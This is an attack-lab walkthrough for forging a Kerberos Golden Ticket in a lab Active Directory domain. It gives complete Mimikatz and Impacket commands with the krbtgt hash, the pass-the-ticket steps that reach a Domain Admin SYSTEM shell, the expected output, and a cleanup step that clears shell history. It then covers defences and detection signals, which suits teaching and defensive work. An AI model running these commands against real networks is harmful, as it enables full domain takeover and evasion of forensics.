# 07 — Golden Ticket (T1558.001)

A Kerberos TGT is encrypted and signed with the `krbtgt` account's key. The KDC trusts any TGT it can decrypt with that key, and it never checks whether the user actually exists or whether the privileges baked into the ticket's PAC are real. So once you own the `krbtgt` hash (from the DCSync in attack 06), you can forge a TGT — a "Golden Ticket" — for *any* user, with *any* group membership, valid for as long as you choose. This walkthrough forges a TGT for a fabricated administrator using Mimikatz on `braavos` and Impacket's `ticketer.py` on Linux, then performs pass-the-ticket to access `kingslanding`'s `C$` as Domain Admin without ever knowing a real account's password.

**MITRE ATT&CK Technique**: [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)

## Prerequisites
- The `krbtgt` NTLM hash (or AES256 key) for `sevenkingdoms.local`, obtained in attack 06: `b4f1c8d2e6a90573c1e8b2d4f6a0c9e3`.
- The domain SID for `sevenkingdoms.local`. From attack 06 the `krbtgt` object SID is `S-1-5-21-1409811732-3669127061-1593309205-502`, so the domain SID is `S-1-5-21-1409811732-3669127061-1593309205`.
- For Mimikatz: a Windows host (`braavos`) — note that forging the ticket requires **no** privileges and **no** DC contact; injecting + using it only needs the ability to run as the current user.

## Tools
- Mimikatz 2.2.0 — run on `braavos` (192.168.56.14).
- Impacket v0.12.0 (`ticketer.py`, `psexec.py`/`smbclient.py`) — run on the Linux attacker (192.168.56.1).
- Rubeus v2.3.2 (optional, for `ptt` import on Windows) — `braavos`.

## Step-by-step Commands

### Step 1 — (braavos, 192.168.56.14) Confirm the domain SID and krbtgt hash
Derive the domain SID by stripping the `-502` RID from the `krbtgt` object SID dumped in attack 06.
```powershell
# Domain SID  = S-1-5-21-1409811732-3669127061-1593309205
# krbtgt NTLM = b4f1c8d2e6a90573c1e8b2d4f6a0c9e3
whoami
klist purge   # start from a clean ticket cache
```

### Step 2 — (braavos, 192.168.56.14) Forge the Golden Ticket with Mimikatz
`kerberos::golden` builds the TGT offline. `/user` is an arbitrary name; `/groups` 512 = Domain Admins; `/ptt` injects it straight into the current LSA session. `/krbtgt` takes the RC4 (NTLM) key.
```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe
# inside mimikatz:
kerberos::golden /user:hand_of_king /domain:sevenkingdoms.local ^
  /sid:S-1-5-21-1409811732-3669127061-1593309205 ^
  /krbtgt:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3 ^
  /id:500 /groups:512,513,518,519,520 /ptt
exit
```

![Step 1](../screenshots/attack-7-step-1.png)

### Step 3 — (braavos, 192.168.56.14) Verify the injected ticket and use it
`klist` shows the forged TGT in cache; then access the DC's admin share — Kerberos auth succeeds with no credentials prompt.
```powershell
klist
dir \\kingslanding.sevenkingdoms.local\C$
```

![Step 2](../screenshots/attack-7-step-2.png)

### Step 4 — (Linux attacker, 192.168.56.1) Alternative: forge with Impacket ticketer.py
`ticketer.py` writes a `.ccache` to disk. Use the AES256 key for a stealthier (etype 18) ticket, or `-nthash` for RC4.
```bash
ticketer.py -nthash b4f1c8d2e6a90573c1e8b2d4f6a0c9e3 \
  -domain-sid S-1-5-21-1409811732-3669127061-1593309205 \
  -domain {{DOMAIN}} \
  -groups 512,513,518,519,520 -user-id 500 hand_of_king
# {{DOMAIN}} = sevenkingdoms.local  -> writes hand_of_king.ccache
```

![Step 3](../screenshots/attack-7-step-3.png)

### Step 5 — (Linux attacker, 192.168.56.1) Pass-the-ticket and access kingslanding C$
Export the ccache into the Kerberos environment, then use any Impacket tool with `-k -no-pass`.
```bash
export KRB5CCNAME=hand_of_king.ccache
klist                       # confirm the forged TGT is loaded
# Access the forest root DC's admin share as the fake Domain Admin:
smbclient.py -k -no-pass {{DOMAIN}}/hand_of_king@kingslanding.sevenkingdoms.local
# or land a SYSTEM shell:
psexec.py -k -no-pass {{DOMAIN}}/hand_of_king@kingslanding.sevenkingdoms.local
```

![Step 4](../screenshots/attack-7-step-4.png)

## Expected Output

Mimikatz `kerberos::golden` (Step 2):
```text
mimikatz # kerberos::golden /user:hand_of_king /domain:sevenkingdoms.local /sid:S-1-5-21-1409811732-3669127061-1593309205 /krbtgt:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3 /id:500 /groups:512,513,518,519,520 /ptt
User      : hand_of_king
Domain    : sevenkingdoms.local (SEVENKINGDOMS)
SID       : S-1-5-21-1409811732-3669127061-1593309205
User Id   : 500
Groups Id : *512 513 518 519 520
ServiceKey: b4f1c8d2e6a90573c1e8b2d4f6a0c9e3 - rc4_hmac_nt
Lifetime  : 5/20/2026 9:14:02 AM ; 5/18/2036 9:14:02 AM ; 5/18/2036 9:14:02 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hand_of_king @ sevenkingdoms.local' successfully submitted for current session
```

`klist` after injection (Step 3):
```text
Current LogonId is 0:0x004f12a3

Cached Tickets: (1)

#0>     Client: hand_of_king @ SEVENKINGDOMS.LOCAL
        Server: krbtgt/SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 5/20/2026 9:14:02 (local)
        End Time:   5/18/2036 9:14:02 (local)
        Renew Time: 5/18/2036 9:14:02 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
```

`dir \\kingslanding\C$` (Step 3) — access granted as forged Domain Admin:
```text
 Volume in drive \\kingslanding.sevenkingdoms.local\C$ has no label.
 Directory of \\kingslanding.sevenkingdoms.local\C$

02/10/2026  08:39 AM    <DIR>          Program Files
02/10/2026  08:39 AM    <DIR>          Program Files (x86)
02/10/2026  08:41 AM    <DIR>          Users
05/08/2026  03:22 PM    <DIR>          Windows
               0 File(s)              0 bytes
```

Impacket `ticketer.py` (Step 4):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sevenkingdoms.local/hand_of_king
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hand_of_king.ccache
```

Pass-the-ticket access (Step 5):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on kingslanding.sevenkingdoms.local.....
# use -> use C$
# ls
drw-rw-rw-          0  Mon Feb 10 08:39:11 2026 Users
drw-rw-rw-          0  Fri May 08 15:22:40 2026 Windows
```

## Cleanup Steps
- On `braavos`: `klist purge` to evict the forged TGT from the LSA cache. The ticket itself was never registered with the DC, so nothing exists on `kingslanding` to remove.
- On the Linux attacker: `unset KRB5CCNAME` and `rm -f hand_of_king.ccache`. Clear shell history.
- No directory objects were modified. The forged ticket simply expires (this lab forged a 10-year lifetime — in a real engagement you would purge it; here, purging the cache is sufficient).
- Leave `krbtgt` untouched so attacks 08 and 10 still work.

## What This Tells You About AD
A Golden Ticket is the logical endgame of `krbtgt` compromise: because every TGT in the domain is signed by one key, and the KDC trusts that signature implicitly, knowledge of the key lets you mint authentication for accounts that may not even exist, with whatever group SIDs you choose to claim. The DC never re-validates the PAC contents against the directory for a TGT it issued, so a forged Domain Admin TGT is indistinguishable from a legitimate one at use time. The two structural defenses are (1) protect `krbtgt` as the crown-jewel secret — limit replication rights (attack 06), and (2) **rotate the `krbtgt` password twice** (with the recommended 10+ hour gap between rotations to avoid breaking in-flight tickets) immediately after any DC compromise, which invalidates all previously-forged Goldens. Detection focuses on anomalies the forger cannot avoid: absurd ticket lifetimes (Mimikatz defaults to 10 years), TGTs for users with no preceding AS-REQ (Event ID 4768) on the DC, RC4 tickets in an AES environment, and PAC group claims (e.g. RID 519 Enterprise Admins) inconsistent with the account's real membership.

## Detection Reference
See [../detection/kql-queries.md#7-golden-ticket](../detection/kql-queries.md#7-golden-ticket) for the forged-TGT signatures (TGS requests — Event ID 4769 — with no corresponding AS-REQ 4768 on the DC, anomalous ticket lifetimes far exceeding the domain MaxTicketAge policy, RC4 etype 0x17 usage from accounts expected to use AES, and PAC SID histories claiming privileged RIDs the account does not hold).

---
Last updated: 2026-05-17

MITRE references:
- [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [TA0008 — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
